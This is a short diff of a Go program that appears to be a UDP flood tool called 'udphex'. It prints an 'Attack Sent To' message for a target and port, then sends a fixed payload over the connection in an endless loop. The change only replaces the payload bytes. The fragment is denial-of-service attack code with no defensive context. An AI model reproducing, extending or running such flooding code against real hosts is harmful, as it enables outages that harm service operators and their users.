@@ -15,7 +15,7 @@ func main() {
 	} else {
 		fmt.Println("Attack Sent To " + target + " Using Port " + port + " With udphex!")
 		for {
-			conn.Write([]byte("\x64\x72\x61\x63\x6f\x73\x75\x64\x70\x68\x65\x78"))
+			conn.Write([]byte("\x61\x73\x64"))
 		}
 	}
 }
